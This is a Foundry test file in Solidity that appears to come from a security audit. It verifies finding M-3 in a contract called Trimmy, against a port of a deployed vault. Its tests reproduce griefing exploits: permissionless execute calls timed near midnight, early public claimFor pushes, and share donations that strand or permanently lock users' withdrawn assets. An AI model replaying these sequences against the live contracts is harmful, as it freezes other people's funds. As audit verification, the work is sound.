// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry} from "../mocks/Mocks.sol";

/// @notice `MyERC4626` (== TESTearnXRP 0x9E63a5D282F2fBb7DcE822B98e363b2719D28319) transcribed
///         from the VERIFIED source fetched 2026-08-07 via
///         coston2-explorer `?module=contract&action=getsourcecode`. Unlike the repo's mocks this
///         one also ports `claim(y,m,d,receiver)` (source line 132) and `_completeWithdraw`
///         (line 394), which is the part that decides WHERE the orphaned assets end up.
contract FirelightVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;
    uint256 public constant PERIOD_DURATION = 1 days;
    uint256 public lagDuration = 300; // reads 300 on chain today

    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawAssets;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawShares;
    mapping(address => mapping(uint256 => uint256)) public requestTimestamps;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawLag;

    error InvalidPeriod();
    error NoPendingWithdrawAssets();
    error TooEarly();

    constructor(IERC20 asset_) ERC20("TESTearnXRP", "tXRP") {
        assetToken = asset_;
    }

    function decimals() public view override returns (uint8) {
        return MockERC20(address(assetToken)).decimals();
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1 so the assertions are readable
        _mint(receiver, shares);
    }

    function maxDeposit(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function previewDeposit(uint256 assets) external pure returns (uint256) {
        return assets;
    }

    // source line 362 `_withdraw`
    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (owner != msg.sender) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assets = shares;
        uint256 period = (block.timestamp + lagDuration) / PERIOD_DURATION;
        pendingWithdrawAssets[receiver][period] += assets;
        pendingWithdrawShares[receiver][period] += shares;
        requestTimestamps[receiver][period] = block.timestamp;
        pendingWithdrawLag[receiver][period] = lagDuration;
    }

    // source line 86 `claimWithdraw` — credits msg.sender
    function claimWithdraw(uint256 period) external returns (uint256 assets) {
        if (period >= block.timestamp / PERIOD_DURATION) revert InvalidPeriod();
        assets = _completeWithdraw(msg.sender, period);
    }

    // source line 132 `claim(y,m,d,receiver)` — PUBLIC, no access control, credits `receiverAddr`
    function claimFor(uint256 period, address receiverAddr) external returns (uint256 assets) {
        if (block.timestamp < period * PERIOD_DURATION) revert TooEarly();
        // _requireLagElapsed
        uint256 lagAtRequest = pendingWithdrawLag[receiverAddr][period];
        if (lagAtRequest < PERIOD_DURATION && lagAtRequest > 0) {
            if (block.timestamp < requestTimestamps[receiverAddr][period] + lagAtRequest) {
                revert TooEarly();
            }
        }
        assets = _completeWithdraw(receiverAddr, period);
    }

    function _completeWithdraw(address receiverAddr, uint256 period)
        internal
        returns (uint256 assets)
    {
        assets = pendingWithdrawAssets[receiverAddr][period];
        if (assets == 0) revert NoPendingWithdrawAssets();
        delete pendingWithdrawAssets[receiverAddr][period];
        delete pendingWithdrawShares[receiverAddr][period];
        delete requestTimestamps[receiverAddr][period];
        delete pendingWithdrawLag[receiverAddr][period];
        assetToken.safeTransfer(receiverAddr, assets);
    }
}

/// Adversarial verification of M-3. Three questions:
///   Q1 does the overwrite actually strand value, without an adversary?  (mechanism)
///   Q2 is the value "stranded in the vault", as the finding states?     (location)
///   Q3 is EXIT_VAULT reachable on the DEPLOYED allowlist?               (severity)
contract RefuteM3AdversarialTest is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    MockERC20 internal fxrp;
    MockERC20 internal wflr;
    MockFtsoV2 internal ftso;
    FirelightVault internal vault;

    address internal alice = makeAddr("alice");
    address internal keeper = makeAddr("keeper");
    address internal griefer = makeAddr("griefer");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(20_672 days + 10 hours); // 2026-08-07 10:00 UTC — nowhere near a period boundary
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wflr = new MockERC20("WC2FLR", "WC2FLR", 18);
        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        vault = new FirelightVault(IERC20(address(fxrp)));
        _feeds();
    }

    function _feeds() internal {
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_FLR, 20_000, 6, uint64(vm.getBlockTimestamp()));
    }

    /// The only configuration in which EXIT_VAULT can work: the SHARE token is allowlisted as the
    /// sell token, so `execute`'s transferFrom hands Trimmy the shares `redeem` then burns.
    function _deployExitCapable() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](1);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));
    }

    /// The EXACT deployed allowlist: tokenCount()==2 (FXRP, WC2FLR), venueCount()==2.
    function _deployLive() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wflr), feedId: FEED_FLR, decimals: 18});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(this), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));
    }

    function _armExit(Trimmy t, uint8 sellTokenId, uint8 venueId, uint128 total, uint128 part)
        internal
        returns (uint256)
    {
        Trimmy.RuleParams memory p = Trimmy.RuleParams({
            sellTokenId: sellTokenId,
            buyTokenId: sellTokenId,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: venueId,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: total,
            partSellAmount: part,
            minOutAbsolute: 0,
            triggerValue: 60, // MIN_SCHEDULE_INTERVAL
            expiry: uint64(block.timestamp + 300 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
        vm.prank(alice);
        return t.arm(p);
    }

    function _giveShares(Trimmy t, address to, uint256 assets) internal {
        fxrp.mint(to, assets);
        vm.startPrank(to);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(assets, to);
        vault.approve(address(t), type(uint256).max);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------
    // Q1 — mechanism. No adversary needed: a griefer is not even required, but is used
    // here because `execute` is permissionless and the victim cannot stop it.
    // ---------------------------------------------------------------------------------

    /// Part one queues under day D. Its bucket is unclaimable until (D+1)*86400. Anyone may call
    /// `execute` 60 s later; if that call lands within `lagDuration` of midnight it files under
    /// D+1 and OVERWRITES `r.claimPeriod` (Trimmy.sol:533) while bucket D is still unclaimable.
    /// Nothing in Trimmy ever takes a period argument again.
    function test_Q1_REPRODUCE_overwriteStrandsTheFirstBucket() public {
        Trimmy t = _deployExitCapable();
        _giveShares(t, alice, 100e6);

        // 23:56:00 UTC. lagDuration is 300 s, so `now + lag` is already the next day index.
        // Part one at 23:51 files under D; part two at 23:56 files under D+1.
        vm.warp(20_673 days - 9 minutes);
        _feeds();
        uint256 id = _armExit(t, 0, 0, 100e6, 50e6);

        vm.prank(keeper);
        t.execute(id);
        uint64 p1 = t.ruleAt(id).claimPeriod;

        vm.warp(vm.getBlockTimestamp() + 5 minutes); // 23:56 — inside lag of midnight
        _feeds();
        vm.prank(griefer); // permissionless
        t.execute(id);
        uint64 p2 = t.ruleAt(id).claimPeriod;

        assertEq(p2, p1 + 1, "the second part filed under the NEXT day index");
        assertEq(t.ruleAt(id).pendingShares, 100e6, "but pendingShares still claims all 100e6");
        assertEq(vault.pendingWithdrawAssets(address(t), p1), 50e6, "bucket 1 is real and orphaned");

        vm.warp(uint256(p2 + 1) * 1 days + 1);
        _feeds();
        uint256 before = fxrp.balanceOf(alice);
        vm.prank(keeper);
        t.claim(id);
        uint256 paid = fxrp.balanceOf(alice) - before;

        vm.prank(keeper);
        vm.expectRevert(Trimmy.NothingPending.selector);
        t.claim(id); // pendingShares was zeroed wholesale at Trimmy.sol:560

        emit log_named_uint("shares burned", 100e6);
        emit log_named_uint("assets paid to alice", paid);
        emit log_named_uint("orphaned bucket", vault.pendingWithdrawAssets(address(t), p1));
        assertEq(paid, 100e6, "alice burned 100e6 of shares and must be paid 100e6 of assets");
    }

    // ---------------------------------------------------------------------------------
    // Q2 — location. The finding says the assets "sit in the vault unreachable". Against the
    // REAL vault they do not: `claim(y,m,d,receiver)` is public and pushes them to Trimmy.
    // ---------------------------------------------------------------------------------

    function test_Q2_orphanLeavesTheVaultButIsStrandedInTrimmyInstead() public {
        Trimmy t = _deployExitCapable();
        _giveShares(t, alice, 100e6);

        vm.warp(20_673 days - 9 minutes);
        _feeds();
        uint256 id = _armExit(t, 0, 0, 100e6, 50e6);
        vm.prank(keeper);
        t.execute(id);
        uint64 p1 = t.ruleAt(id).claimPeriod;
        vm.warp(vm.getBlockTimestamp() + 5 minutes);
        _feeds();
        vm.prank(griefer);
        t.execute(id);
        uint64 p2 = t.ruleAt(id).claimPeriod;

        // Anybody, for anybody: the vault's own public `claim` pushes bucket p1 to Trimmy.
        vm.warp(uint256(p2 + 1) * 1 days + 1);
        vm.prank(griefer);
        vault.claimFor(p1, address(t));

        assertEq(vault.pendingWithdrawAssets(address(t), p1), 0, "not in the vault any more");
        assertEq(fxrp.balanceOf(address(t)), 50e6, "it is sitting in Trimmy");

        // Trimmy still only settles the balance DELTA around claimWithdraw (Trimmy.sol:555-558),
        // so the pushed 50e6 is invisible to every payout path. No sweep function exists.
        _feeds();
        uint256 before = fxrp.balanceOf(alice);
        vm.prank(keeper);
        t.claim(id);
        assertEq(fxrp.balanceOf(alice) - before, 50e6, "alice is paid the second bucket only");
        assertEq(fxrp.balanceOf(address(t)), 50e6, "and 50e6 is stranded in Trimmy forever");
    }

    // ---------------------------------------------------------------------------------
    // Q3 — reachability on the DEPLOYED instance.
    // ---------------------------------------------------------------------------------

    /// tokenCount()==2 on chain and neither entry is the vault share token, so the sell token of
    /// an EXIT_VAULT rule can only be FXRP or WC2FLR. `_doQueueRedeem` then burns share tokens
    /// Trimmy does not hold. Live share balance of Trimmy is 0 (verified by chain read).
    function test_Q3_REFUTE_unreachableOnTheDeployedAllowlist() public {
        Trimmy t = _deployLive();
        fxrp.mint(alice, 1000e6);
        vm.prank(alice);
        fxrp.approve(address(t), type(uint256).max);

        uint256 id = _armExit(t, 0, 1, 100e6, 50e6);
        assertEq(vault.balanceOf(address(t)), 0, "Trimmy holds no shares, exactly as on chain");
        vm.prank(keeper);
        vm.expectRevert(); // ERC20InsufficientBalance inside _burn(Trimmy, shares)
        t.execute(id);
    }

    // ---------------------------------------------------------------------------------
    // Does M-3's proposed fix (keying the claim by period) actually save the money?
    // No: against the REAL vault the bucket can be emptied by anyone 300 s after the redeem,
    // a full day before Trimmy is allowed to claim it, and `claim()` then reverts FOREVER.
    // ---------------------------------------------------------------------------------

    function test_realVault_publicPushBricksClaimEvenWithASinglePeriod() public {
        Trimmy t = _deployExitCapable();
        _giveShares(t, alice, 50e6);

        uint256 id = _armExit(t, 0, 0, 50e6, 50e6); // ONE part: no overwrite anywhere
        vm.prank(keeper);
        t.execute(id);
        uint64 p = t.ruleAt(id).claimPeriod;

        // `claim(y,m,d,receiver)` only needs now >= period*86400 and lagDuration elapsed. The
        // bucket was filed under TODAY's index, so 300 s later the griefer can already push.
        vm.warp(vm.getBlockTimestamp() + 301);
        vm.prank(griefer);
        vault.claimFor(p, address(t));
        assertEq(fxrp.balanceOf(address(t)), 50e6, "assets pushed into Trimmy, bucket empty");

        // Trimmy's claim is now unsatisfiable: claimWithdraw reverts NoPendingWithdrawAssets.
        vm.warp(uint256(p + 1) * 1 days + 1);
        _feeds();
        vm.prank(keeper);
        vm.expectRevert(FirelightVault.NoPendingWithdrawAssets.selector);
        t.claim(id);

        assertEq(t.ruleAt(id).pendingShares, 50e6, "pendingShares can never be cleared");
        assertEq(fxrp.balanceOf(alice), 0, "alice is paid nothing, forever");
    }

    /// ...but the gate is only Trimmy's share BALANCE, not the allowlist. Shares are transferable,
    /// so a third party donating shares to the deployed Trimmy re-opens M-3 on the live allowlist.
    /// (It also burns the user's FXRP, which is M-6: the pulled sell token is never returned.)
    function test_Q3_donatedSharesReopenItOnTheLiveAllowlist() public {
        Trimmy t = _deployLive();
        fxrp.mint(alice, 1000e6);
        vm.prank(alice);
        fxrp.approve(address(t), type(uint256).max);
        _giveShares(t, griefer, 100e6);
        vm.prank(griefer);
        vault.transfer(address(t), 100e6); // donation — no allowlist change needed

        vm.warp(20_673 days - 9 minutes);
        _feeds();
        uint256 id = _armExit(t, 0, 1, 100e6, 50e6);
        vm.prank(keeper);
        t.execute(id);
        uint64 p1 = t.ruleAt(id).claimPeriod;
        vm.warp(vm.getBlockTimestamp() + 5 minutes);
        _feeds();
        vm.prank(keeper);
        t.execute(id);
        assertEq(t.ruleAt(id).claimPeriod, p1 + 1, "overwritten on the LIVE allowlist too");
        assertEq(vault.pendingWithdrawAssets(address(t), p1), 50e6, "bucket 1 orphaned");
    }
}
